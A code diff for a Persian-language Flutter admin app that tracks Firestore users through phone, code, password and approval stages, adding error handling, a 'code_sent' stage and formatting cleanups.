@@ -4,7 +4,25 @@ import 'package:cloud_firestore/cloud_firestore.dart';
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
-  await Firebase.initializeApp();
+  try {
+    await Firebase.initializeApp();
+  } catch (e) {
+    runApp(MaterialApp(
+      debugShowCheckedModeBanner: false,
+      home: Scaffold(
+        backgroundColor: const Color(0xFF0F0F1A),
+        body: Center(
+          child: Padding(
+            padding: const EdgeInsets.all(24),
+            child: Text('خطا در اتصال:\n$e',
+              style: const TextStyle(color: Colors.white, fontSize: 14),
+              textAlign: TextAlign.center),
+          ),
+        ),
+      ),
+    ));
+    return;
+  }
   runApp(const AdminApp());
 }
 
@@ -50,8 +68,17 @@ class AdminHome extends StatelessWidget {
           if (snap.connectionState == ConnectionState.waiting) {
             return const Center(child: CircularProgressIndicator());
           }
+          if (snap.hasError) {
+            return Center(child: Padding(
+              padding: const EdgeInsets.all(24),
+              child: Text('خطا: ${snap.error}',
+                style: const TextStyle(color: Colors.redAccent, fontSize: 14),
+                textAlign: TextAlign.center),
+            ));
+          }
           if (!snap.hasData || snap.data!.docs.isEmpty) {
-            return const Center(child: Text('هنوز کاربری ثبت‌نام نکرده', style: TextStyle(fontSize: 16, color: Colors.white60)));
+            return const Center(child: Text('هنوز کاربری ثبت‌نام نکرده',
+              style: TextStyle(fontSize: 16, color: Colors.white60)));
           }
           final docs = snap.data!.docs;
           return ListView.builder(
@@ -94,9 +121,10 @@ class AdminHome extends StatelessWidget {
   (String, Color, IconData) _statusInfo(String s) {
     switch (s) {
       case 'phone_entered': return ('مرحله ۱: شماره وارد شده', Colors.orange, Icons.phone);
-      case 'code_entered': return ('مرحله ۲: کد تأیید شد', Colors.blue, Icons.check);
-      case 'waiting_password': return ('مرحله ۳: منتظر تعیین رمز', Colors.amber, Icons.lock_open);
-      case 'waiting_approval': return ('مرحله ۴: منتظر تأیید تو', Colors.purple, Icons.hourglass_top);
+      case 'code_sent': return ('مرحله ۲: کد فرستاده شده', Colors.cyan, Icons.send);
+      case 'code_entered': return ('مرحله ۳: کد تأیید شد', Colors.blue, Icons.check);
+      case 'waiting_password': return ('مرحله ۴: منتظر تعیین رمز', Colors.amber, Icons.lock_open);
+      case 'waiting_approval': return ('مرحله ۵: منتظر تأیید تو', Colors.purple, Icons.hourglass_top);
       case 'active': return ('فعال ✅', Colors.green, Icons.verified_user);
       case 'blocked': return ('بلاک شده', Colors.red, Icons.block);
       default: return (s, Colors.grey, Icons.help);
@@ -128,42 +156,96 @@ class _UserDetailState extends State<UserDetail> {
     _hintCtrl.text = widget.data['passwordHint']?.toString() ?? '';
   }
 
+  @override
+  void dispose() {
+    _codeCtrl.dispose();
+    _hintCtrl.dispose();
+    super.dispose();
+  }
+
   Future<void> _update(Map<String, dynamic> values) async {
     setState(() => _busy = true);
     try {
       values['lastUpdate'] = FieldValue.serverTimestamp();
       await FirebaseFirestore.instance.collection('users').doc(widget.phone).update(values);
     } catch (e) {
-      if (mounted) ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('خطا: $e')));
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('خطا: $e')));
+      }
     }
-    setState(() => _busy = false);
+    if (mounted) setState(() => _busy = false);
   }
 
   Future<void> _sendCode() async {
     final c = _codeCtrl.text.trim();
-    if (c.isEmpty) return;
+    if (c.isEmpty) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text('اول کد رو بنویس')));
+      return;
+    }
     await _update({'code': c, 'status': 'code_sent'});
-    if (mounted) ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('کد ذخیره شد ✅ کاربر باید وارد کنه')));
+    if (mounted) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text('کد ذخیره شد ✅ کاربر باید وارد کنه')));
+    }
   }
 
   Future<void> _saveHint() async {
-    await _update({'passwordHint': _hintCtrl.text.trim(), 'passwordMode': _mode});
-    if (mounted) ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('تنظیمات ذخیره شد ✅')));
+    final newStatus = _mode == 'with_password' ? 'waiting_password' : 'active';
+    await _update({
+      'passwordHint': _hintCtrl.text.trim(),
+      'passwordMode': _mode,
+      'status': newStatus,
+    });
+    if (mounted) {
+      final msg = _mode == 'with_password'
+        ? 'حالت رمزدار فعال شد. کاربر رمز تعیین کنه.'
+        : 'بدون رمز فعال شد. کاربر می‌تونه وارد شه.';
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));
+    }
   }
 
   Future<void> _activate() async {
     await _update({'status': 'active'});
-    if (mounted) ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('کاربر فعال شد ✅')));
+    if (mounted) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text('کاربر فعال شد ✅')));
+    }
   }
 
   Future<void> _block() async {
     await _update({'status': 'blocked'});
-    if (mounted) ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('کاربر بلاک شد')));
+    if (mounted) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text('کاربر بلاک شد')));
+    }
   }
 
   Future<void> _reset() async {
-    await FirebaseFirestore.instance.collection('users').doc(widget.phone).delete();
+    try {
+      await FirebaseFirestore.instance.collection('users').doc(widget.phone).delete();
+    } catch (_) {}
     if (mounted) Navigator.pop(context);
+  }
+
+  void _confirmReset() {
+    showDialog(context: context, builder: (_) => AlertDialog(
+      backgroundColor: const Color(0xFF1A1A2E),
+      title: const Text('حذف کاربر؟'),
+      content: const Text('اطلاعات کاربر کاملاً پاک می‌شه.'),
+      actions: [
+        TextButton(onPressed: () => Navigator.pop(context), child: const Text('لغو')),
+        TextButton(
+          onPressed: () { Navigator.pop(context); _reset(); },
+          child: const Text('حذف', style: TextStyle(color: Colors.red)),
+        ),
+      ],
+    ));
+  }
+
+  bool _advanced(String st) {
+    const advanced = ['code_entered', 'waiting_password', 'waiting_approval', 'active'];
+    return advanced.contains(st);
   }
 
   @override
@@ -174,24 +256,34 @@ class _UserDetailState extends State<UserDetail> {
         backgroundColor: const Color(0xFF1A1A2E),
         title: Text(widget.phone),
         actions: [
-          IconButton(icon: const Icon(Icons.delete, color: Colors.redAccent), onPressed: _confirmReset),
+          IconButton(
+            icon: const Icon(Icons.delete, color: Colors.redAccent),
+            onPressed: _confirmReset,
+          ),
         ],
       ),
       body: StreamBuilder<DocumentSnapshot>(
         stream: _stream,
         builder: (context, snap) {
+          if (snap.hasError) {
+            return Center(child: Text('خطا: ${snap.error}',
+              style: const TextStyle(color: Colors.redAccent)));
+          }
           if (!snap.hasData) return const Center(child: CircularProgressIndicator());
           final d = snap.data!.data() as Map<String, dynamic>? ?? {};
+          final status = d['status'] ?? 'phone_entered';
           return SingleChildScrollView(
             padding: const EdgeInsets.all(16),
             child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
               _stageCard('مرحله ۱ — شماره وارد شد', d['phone'] != null),
-              _stageCard('مرحله ۲ — کد تأیید', d['status'] == 'code_entered' || d['status'] == 'waiting_password' || d['status'] == 'waiting_approval' || d['status'] == 'active'),
-              _stageCard('مرحله ۳ — تعیین رمز', d['status'] == 'waiting_approval' || d['status'] == 'active'),
-              _stageCard('مرحله ۴ — تأیید نهایی', d['status'] == 'active'),
+              _stageCard('مرحله ۲ — کد فرستاده شد', status == 'code_sent' || _advanced(status)),
+              _stageCard('مرحله ۳ — کد تأیید شد', _advanced(status) && status != 'code_sent'),
+              _stageCard('مرحله ۴ — رمز تعیین/فعال', status == 'active' || status == 'waiting_approval'),
+              _stageCard('مرحله ۵ — فعال ✅', status == 'active'),
               const SizedBox(height: 20),
               const Divider(),
-              const Text('🔐 ارسال کد به کاربر', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
+              const Text('📤 ارسال کد به کاربر',
+                style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
               const SizedBox(height: 8),
               TextField(
                 controller: _codeCtrl,
@@ -200,7 +292,10 @@ class _UserDetailState extends State<UserDetail> {
                 style: const TextStyle(fontSize: 24, letterSpacing: 8),
                 decoration: InputDecoration(
                   hintText: '_____', filled: true, fillColor: const Color(0xFF1A1A2E),
-                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
+                  border: OutlineInputBorder(
+                    borderRadius: BorderRadius.circular(12),
+                    borderSide: BorderSide.none,
+                  ),
                 ),
               ),
               const SizedBox(height: 8),
@@ -215,7 +310,8 @@ class _UserDetailState extends State<UserDetail> {
               ),
               const SizedBox(height: 20),
               const Divider(),
-              const Text('🔑 حالت رمز', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
+              const Text('🔑 حالت رمز',
+                style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
               const SizedBox(height: 8),
               RadioListTile<String>(
                 value: 'with_password', groupValue: _mode,
@@ -239,7 +335,10 @@ class _UserDetailState extends State<UserDetail> {
                   decoration: InputDecoration(
                     hintText: 'راهنمای رمز...',
                     filled: true, fillColor: const Color(0xFF1A1A2E),
-                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
+                    border: OutlineInputBorder(
+                      borderRadius: BorderRadius.circular(12),
+                      borderSide: BorderSide.none,
+                    ),
                   ),
                 ),
               ],
@@ -247,7 +346,7 @@ class _UserDetailState extends State<UserDetail> {
               ElevatedButton.icon(
                 onPressed: _busy ? null : _saveHint,
                 icon: const Icon(Icons.save),
-                label: const Text('ذخیره تنظیمات'),
+                label: const Text('ذخیره تنظیمات و اعمال'),
                 style: ElevatedButton.styleFrom(
                   backgroundColor: const Color(0xFFFFC107), foregroundColor: Colors.black,
                   padding: const EdgeInsets.symmetric(vertical: 14),
@@ -255,7 +354,8 @@ class _UserDetailState extends State<UserDetail> {
               ),
               const SizedBox(height: 20),
               const Divider(),
-              const Text('✅ تأیید نهایی', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
+              const Text('✅ تأیید نهایی',
+                style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
               const SizedBox(height: 8),
               Row(children: [
                 Expanded(child: ElevatedButton.icon(
@@ -303,16 +403,4 @@ class _UserDetailState extends State<UserDetail> {
       ))),
     ]),
   );
-
-  void _confirmReset() {
-    showDialog(context: context, builder: (_) => AlertDialog(
-      backgroundColor: const Color(0xFF1A1A2E),
-      title: const Text('حذف کاربر؟'),
-      content: const Text('اطلاعات کاربر کاملاً پاک می‌شه.'),
-      actions: [
-        TextButton(onPressed: () => Navigator.pop(context), child: const Text('لغو')),
-        TextButton(onPressed: () { Navigator.pop(context); _reset(); }, child: const Text('حذف', style: TextStyle(color: Colors.red))),
-      ],
-    ));
-  }
 }
